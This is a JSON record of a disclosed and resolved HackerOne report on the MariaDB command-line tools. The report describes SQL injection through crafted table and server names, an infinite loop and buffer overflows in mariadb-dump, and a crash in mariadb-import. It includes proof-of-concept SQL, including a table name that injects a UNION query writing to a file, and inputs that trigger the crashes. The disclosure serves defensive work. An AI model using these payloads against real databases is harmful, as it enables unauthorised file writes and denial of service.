@@ -1,0 +1,112 @@
+{
+  "id": 3849007,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zODQ5MDA3",
+  "url": "https://hackerone.com/reports/3849007",
+  "title": "MariaDB CLI Utility Issues",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2026-07-07T16:56:09.671Z",
+  "submitted_at": "2026-07-07T16:56:09.848Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "vortfu",
+    "url": "/vortfu",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/004/982/1ef285fb263d30f189dc6a8038e1d5c46086e9d9_original.png/dd1dfc8fc7352772e4a8994c07e1d628d34edc74db48377c707f10829dc23d53"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 8724,
+    "url": "https://hackerone.com/mariadb",
+    "handle": "mariadb",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/dd1dfc8fc7352772e4a8994c07e1d628d34edc74db48377c707f10829dc23d53",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/2a499a0b732abf809ef45635d9ad400431480fafd17452e700cbdba6fd64fe85"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "MariaDB",
+      "twitter_handle": "mariadb_org",
+      "website": "https://mariadb.org",
+      "about": "MariaDB is a high performance, open source database that helps the world's busiest websites deliver more content, faster."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": true,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2026-86047"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-11-08T11:41:49.858Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-10-09T11:41:47.659Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "`mariadb-show` (and to a lesser extent `mariadb-dump` and `mariadb-convert-table-format.sh`) may be tricked into executing malicious SQL if run against an attacker controlled database due to dynamically generated queries not escaping user controlled values.\n\n`mariadb-dump` contains additional issues that may lead to client-side DoS / buffer overflow issues.\n\n\n## mariadb-show --count --verbose\n\n`mariadb-show` may EXECUTE malicious queries when used as above because table names returned from `SHOW TABLES` end up being used without escaping in a ``SELECT COUNT(*) FROM `%s`;`` query.\n\n[client/mysqlshow.c](https://github.com/MariaDB/server/blob/bd366d81b80aa65fc76ec570fa0bf218a996853b/client/mysqlshow.c#L606-L623)\n```c++\n/* Print the count of rows for each table */\nmy_snprintf(query, sizeof(query), \"SELECT COUNT(*) FROM `%s`\",\n            row[0]);\n\nif (!(mysql_query(mysql,query)))\n...\n```\n\nadditional potential sinks:\n - [client/mysqlshow.c:466](https://github.com/MariaDB/server/blob/bd366d81b80aa65fc76ec570fa0bf218a996853b/client/mysqlshow.c#L466-L467)\n - [client/mysqlshow.c:725](https://github.com/MariaDB/server/blob/bd366d81b80aa65fc76ec570fa0bf218a996853b/client/mysqlshow.c#L725)\n - [client/mysqlshow.c:738](https://github.com/MariaDB/server/blob/bd366d81b80aa65fc76ec570fa0bf218a996853b/client/mysqlshow.c#L738)\n - [client/mysqlshow.c:762](https://github.com/MariaDB/server/blob/bd366d81b80aa65fc76ec570fa0bf218a996853b/client/mysqlshow.c#L762)\n\n\n### Proof of Concept\n\n```sql\nCREATE TABLE poc(i INT);\nINSERT INTO poc VALUES (1), (2), (3);\n\nCREATE TABLE `poc`` HAVING 0 UNION SELECT user() INTO OUTFILE '/tmp/show_p'#`(i INT);\n\nSHOW TABLES;\n-- poc\n-- poc` HAVING 0 UNION SELECT user() INTO OUTFILE '/tmp/show_p'#\n```\n\n`mariadb-show` can then be tricked into executing\n\n```sql\nSELECT COUNT(*) FROM `poc` HAVING 0 UNION SELECT user() INTO OUTFILE '/tmp/show_p'#`\n```\n\n> ```\n> root@localhost\n> ```\n\n\n## mariadb-convert-table-format.sh\n\nTable names are also not escaped in `mariadb-convert-table-format.sh`, but the `SHOW TABLE STATUS` injection doesn't give a lot of room for an attacker to player with. It's possible to inject a single quote `'` or `LIKE` wildcards if needed.\n\n[scripts/mysql_convert_table_format.sh:99](https://github.com/MariaDB/server/blob/bd366d81b80aa65fc76ec570fa0bf218a996853b/scripts/mysql_convert_table_format.sh#L99)\n```perl\n$sth=$dbh->prepare(\"show table status like '$table'\");\n```\n\n```sql\nCREATE TABLE `poc`(\n  id INT\n) ENGINE=MyISAM;\n\nCREATE TABLE `poc%`(\n  id INT\n) ENGINE=InnoDB;\n```\n\n`mariadb-convert-table-format --engine=MYISAM --verbose ...`\n\n> ```\n> Converting tables:\n> poc already uses the 'MYISAM' engine;  Ignored\n> poc% already uses the 'MYISAM' engine;  Ignored\n> ```\n\n\n## mariadb-dump --system=servers\n\n[client/mysqldump.cc:5241](https://github.com/MariaDB/server/blob/bd366d81b80aa65fc76ec570fa0bf218a996853b/client/mysqldump.cc#L5241)\n```c++\nmy_snprintf(buff, sizeof(buff), \"show create server %s\", row[0]);\n```\n\n```\nCREATE SERVER `poc`\n  FOREIGN DATA WRAPPER mysql\n  OPTIONS (HOST '127.0.0.1', DATABASE 'base_db');\n\nCREATE SERVER `poc # hidden`\n  FOREIGN DATA WRAPPER mysql\n  OPTIONS (HOST '192.0.2.123', DATABASE 'hidden_db');\n```\n\nBecause the `SHOW CREATE SERVER` doesn't quote server names, anything with a space in cause an injection. Not very useful ... but it's there.\n\n\n## mariadb-dump --events (infinite loop)\n\n`mariadb-dump --events` tries to create a delimiter not present in the event body, but because `create_delimiter()` increments `delimiter_max_size` instead of `proposed_length` during the loop, the proposed delimiter is always stuck as `;;` - causing an infinite loop if `;;` is already present.\n\n[client/mysqldump.cc:2674](https://github.com/MariaDB/server/blob/bd366d81b80aa65fc76ec570fa0bf218a996853b/client/mysqldump.cc#L2674-L2695)\n```c++\nstatic char *create_delimiter(char *query, char *delimiter_buff, \n                              int delimiter_max_size) \n{\n  int proposed_length;\n  char *presence;\n\n\n  delimiter_buff[0]= ';';  /* start with one semicolon, and */\n\n\n  for (proposed_length= 2; proposed_length < delimiter_max_size; \n      delimiter_max_size++) {\n\n\n    delimiter_buff[proposed_length-1]= ';';  /* add semicolons, until */\n    delimiter_buff[proposed_length]= '\\0';\n\n\n    presence = strstr(query, delimiter_buff);\n    if (presence == NULL) { /* the proposed delimiter is not in the query. */\n       return delimiter_buff;\n    }\n\n\n  }\n  return NULL;  /* but if we run out of space, return nothing at all. */\n}\n```\n\n### Proof of Concept\n\n```sql\nCREATE EVENT e_low_hang\nON SCHEDULE AT CURRENT_TIMESTAMP + INTERVAL 1 DAY\nDO SELECT ';;' AS marker;\n```\n\n```\n$ mariadb-dump --events ...\n...\n--\n-- Dumping events for database 'victimdb'\n--\n/*!50106 SET @save_time_zone= @@TIME_ZONE */ ;\n/*!50106 DROP EVENT IF EXISTS `e_low_hang` */;\n^C\n```\n\n\n## mariadb-dump (Buffer Overflows)\n\nThere are a couple of places where queries relating to users are copied into buffers that are potentially too small if the `'user'@'host'` is long enough (doesn't have to be max length, overflows well before then). Doesn't seem to be overly exploitable at first glance.\n\n[client/mysqldump.cc:4959](https://github.com/MariaDB/server/blob/bd366d81b80aa65fc76ec570fa0bf218a996853b/client/mysqldump.cc#L4959-L4982)\n```c++\nif (mysql_query_with_error_report(mysql, &tableres,\n                                  \"SELECT CONCAT(QUOTE(u.user), '@', QUOTE(u.Host)) AS u \"\n                                  \"FROM mysql.user u \"\n                                  \" /*...*/\"))\n  return 1;\nwhile ((row= mysql_fetch_row(tableres)))\n{\n  char buf[200];\n  if (opt_replace_into)\n    fprintf(md_result_file,\n      \"...\",\n      quote_for_equal(row[0],buf), ...);\n  ...\n```\n\n[client/mysqldump.cc:2307](https://github.com/MariaDB/server/blob/bd366d81b80aa65fc76ec570fa0bf218a996853b/client/mysqldump.cc#L2307-L2325)\n```c++\nstatic char *quote_for_equal(const char *name, char *buff)\n{\n  char *to= buff;\n  *to++= '\\'';\n  while (*name)\n  {\n    if (*name == '\\\\')\n    {\n      *to++='\\\\';\n    }\n    if (*name == '\\'')\n      *to++= '\\'';\n    *to++= *name++;\n  }\n  to[0]= '\\'';\n  to[1]= 0;\n  return buff;\n\n\n}\n```\n\n```sql\nCREATE USER 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'@'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';\n```\n\n```\n$ mariadb-dump --system=users --replace ...\n...\nDROP ROLE mariadb_dump_import_role;\n/*M!100203 EXECUTE IMMEDIATE CONCAT('SET ROLE ', @current_role) */;\nzsh: abort ...\n```\n\n`mariadb-dump` also appears to overflow some buffers while dumping a view whose definer is excessively large. The overflow seems to get caught on an ASAN build, doesn't crash a release build, but these buffers (maybe elsewhere too?) should probably be increased now that longer username / hosts are accepted?\n\n\n[client/mysqldump.cc:7192](https://github.com/MariaDB/server/blob/bd366d81b80aa65fc76ec570fa0bf218a996853b/client/mysqldump.cc#L7192-L7219)\n```c++\nchar search_buf[256], replace_buf[256];\n...\n\nparse_user(row[1], lengths[1], user_name_str, &user_name_len,\n           host_name_str, &host_name_len);\n\nptr= search_buf;\nsearch_len=\n  (ulong)(strxmov(ptr, \"DEFINER=\",\n                  quote_name(user_name_str, quoted_user_name_str, FALSE),\n                  \"@\",\n                  quote_name(host_name_str, quoted_host_name_str, FALSE),\n                  \" SQL SECURITY \", row[2], NullS) - ptr);\n...\n```\n\n\n## (BONUS BUG) mariadb-import\n\n`mariadb-import --lock-tables` crashes the client for ordinary direct-file imports. The root cause is that the direct-file branch iterates `argv` to build `files_to_load`, leaving `argv` pointing at the final `NULL`.\n\nThe later `--lock-tables` path still passes the original remaining argument count plus the now-exhausted pointer to `lock_table()`, which then calls `fn_format()` with a `NULL` filename.\n\n[client/mysqlimport.cc:L1318](https://github.com/MariaDB/server/blob/bd366d81b80aa65fc76ec570fa0bf218a996853b/client/mysqlimport.cc#L1318-L1322)\n```c++\nfor (; *argv != NULL; argv++)\n{\n  table_load_params p(*argv, \"\", current_db, 0);\n  files_to_load.push_back(p);\n}\n...\n\nif (lock_tables)\n  lock_table(mysql, argc, argv);\n```\n\n[client/mysqlimport.cc:840](https://github.com/MariaDB/server/blob/main/client/mysqlimport.cc#L840-L857)\n```c++\nstatic void lock_table(MYSQL *mysql, int tablecount, char **raw_tablename)\n{\n  ...\n\n  for (i=0 ; i < tablecount ; i++)\n  {\n    fn_format(tablename, raw_tablename[i], \"\", \"\", 1 | 2);\n    dynstr_append(&query, tablename);\n    dynstr_append(&query, \" WRITE,\");\n  }\n  ...\n```\n\nand ...\n\n```\n$ mariadb-import --lock-tables db /tmp/x.txt\nzsh: segmentation fault\n```\n\n## Impact\n\n`mariadb-show --count` may EXECUTE attacker-injected SQL if ran against an attacker controlled db.",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2026-11-08T11:41:47.853Z",
+  "allow_singular_disclosure_after": -18902.072542975,
+  "singular_disclosure_allowed": true,
+  "vote_count": 5,
+  "voters": [
+    "2026",
+    "prox674",
+    "rayanmorven",
+    "fawzii",
+    "yuvale6"
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": [],
+    "can_view_ave_report?": false
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
